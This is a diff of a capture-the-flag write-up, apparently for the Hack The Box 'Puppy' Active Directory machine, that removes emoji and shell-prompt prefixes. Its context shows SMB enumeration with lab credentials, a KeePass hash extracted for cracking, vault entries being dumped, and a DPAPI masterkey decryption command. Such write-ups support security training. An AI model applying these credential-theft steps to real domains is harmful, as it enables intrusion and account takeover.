@@ -182,7 +182,7 @@ This confirms that the command successfully added `levi.james` as a member of th
 faketime 'now + 7 hours' netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
 ```
 
-### 🧠 Notes:
+###  Notes:
 
 * **`faketime 'now + 7 hours'`**: Temporarily advances the system clock by 7 hours for this command. This can help bypass time sync issues or Kerberos-related expiration.
 * **`netexec smb`**: NetExec (formerly CrackMapExec) is being used to enumerate SMB shares.
@@ -223,13 +223,13 @@ SMB         10.10.11.70     445    DC               SYSVOL          READ        
 
 ## Next Steps
 
-* 🔍 **Explore the `DEV` share**:
+*  **Explore the `DEV` share**:
 
   ```bash
   smbclient //puppy.htb/DEV -U "levi.james"
   ```
 
-* 🔍 **Inspect `NETLOGON` and `SYSVOL`** for:
+*  **Inspect `NETLOGON` and `SYSVOL`** for:
 
   * Logon scripts
   * GPOs
@@ -306,7 +306,7 @@ smb: \> ls
 2. **Extract KeePass hash:**
 
    ```bash
-   └─$ keepass2john recovery.kdbx               
+   $ keepass2john recovery.kdbx               
    recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
    ```
 ---
@@ -333,7 +333,7 @@ Below are the commands and outputs, with discovered passwords highlighted for cl
 <summary>Show KeePass entries and passwords</summary>
 
 ```
-└─$ keepassxc-cli open recovery.kdbx
+$ keepassxc-cli open recovery.kdbx
 Enter password to unlock recovery.kdbx: 
 recovery> ls
 JAMIE WILLIAMSON
@@ -875,7 +875,7 @@ Mode                 LastWriteTime         Length Name
 
 ```bash
 base64 -d cng.b64 > cngblob.bin
-└─$ grep -v "CERTIFICATE" cng.b64 | tr -d '\n\r' | base64 -d > cngblob.bin
+$ grep -v "CERTIFICATE" cng.b64 | tr -d '\n\r' | base64 -d > cngblob.bin
 
 ```
 
@@ -963,7 +963,7 @@ If the session does not open, check firewall rules, payload architecture, and en
 
 ```bash
 I can not get this to work:
-└─$ impacket-dpapi masterkey -password 'ChefSteph2025!' -file 1038bdea-4935-41a8-a224-9b3720193c86 -file ea607a17-d89b-4341-8dfb-ee499ba635d6 -sid S-1-5-21-1487982659-1829050783-2281216199-1105 
+$ impacket-dpapi masterkey -password 'ChefSteph2025!' -file 1038bdea-4935-41a8-a224-9b3720193c86 -file ea607a17-d89b-4341-8dfb-ee499ba635d6 -sid S-1-5-21-1487982659-1829050783-2281216199-1105 
 
 ```
 How to solve the challenge:
